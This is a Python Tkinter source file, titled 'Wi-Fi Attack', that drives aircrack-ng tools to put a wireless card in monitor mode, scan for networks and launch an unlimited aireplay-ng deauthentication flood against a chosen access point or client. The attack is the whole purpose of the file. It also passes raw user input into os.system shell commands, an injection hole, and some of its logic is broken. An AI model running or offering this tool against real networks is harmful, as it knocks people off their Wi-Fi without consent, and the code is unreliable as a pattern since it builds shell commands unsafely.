import os
import time
import subprocess
from tkinter import *

root = Tk()
root.title("Wi-Fi Attack")
root.configure(bg='black')

def set_dark_mode(widget):
    widget.configure(bg='black', fg='white')

# network interface-mon
iwconfig_output = subprocess.check_output(['iwconfig']).decode('utf-8')
iwconfig_label = Label(root, text=iwconfig_output)
set_dark_mode(iwconfig_label)
iwconfig_label.pack()

interface_label = Label(root, text="What is your network interface name?")
set_dark_mode(interface_label)
interface_label.pack()
interface_entry = Entry(root)
interface_entry.pack()

def on_monitoring_click():
    interface = interface_entry.get()
    os.system('airmon-ng start ' + interface)
    os.system('airmon-ng check kill ' + interface)
    monitoring_button.pack_forget()
    monitoring_label.pack_forget()
    interface_entry.pack_forget()
    interface_label.pack_forget()
    bssid_label.pack()
    bssid_entry.pack()
    bssid_help_button.pack()

monitoring_label = Label(root, text="Do you want the network change to Monitor?")
set_dark_mode(monitoring_label)
monitoring_label.pack()
monitoring_button = Button(root, text="Next", command=on_monitoring_click)
monitoring_button.pack()

def scan_wifi():
    interface = interface_entry.get()
    os.system("airodump-ng " + interface) # Run airodump-ng for scanning
    time.sleep(1) # Sleep for 1 seconds
    os.system("pkill airodump-ng") # Stop airodump-ng after 1 seconds

bssid_label = Label(root, text="Enter the BSSID of the Wi-Fi:")
set_dark_mode(bssid_label)
bssid_entry = Entry(root)
bssid_entry.pack()

def bssid_help():
    scan_wifi()

bssid_help_button = Button(root, text="Help", command=bssid_help)
bssid_help_button.pack()

def find_ch():
    bssid = bssid_entry.get()
    ch = ch_entry.get()
    interface = interface_entry.get()
    os.system(f"airodump-ng --bssid {bssid} -c {ch} " + interface) # final scan
    bssid_help_button.pack_forget()
    bssid_entry.pack_forget()
    bssid_label.pack_forget()
    ch_label.pack()
    ch_entry.pack()
    ch_help_button.pack()

ch_label = Label(root, text="Enter the channel of the Wi-Fi:")
set_dark_mode(ch_label)
ch_entry = Entry(root)
ch_entry.pack()

def ch_help():
    scan_wifi()

ch_help_button = Button(root, text="Help", command=ch_help)
ch_help_button.pack()

check_button = Button(root, text="Check", command=find_ch)
check_button.pack()

def attack():
    bssid = bssid_entry.get()
    interface = interface_entry.get()
    destination = destination_entry.get()
    if destination:
        os.system(f"aireplay-ng --deauth 0 -a {bssid} -c {destination} {interface}")
    else:
        os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}")
        
def next_step():
    ch_help_button.pack_forget()
    ch_entry.pack_forget()
    ch_label.pack_forget()
    
destination_label = Label(root, text="Enter the Wi-Fi client essid (leave blank for broadcast attack):")
set_dark_mode(destination_label)
destination_entry = Entry(root)
destination_entry.pack()

attack_button = Button(root, text="Attack", command=attack)
attack_button.pack()

root.mainloop()
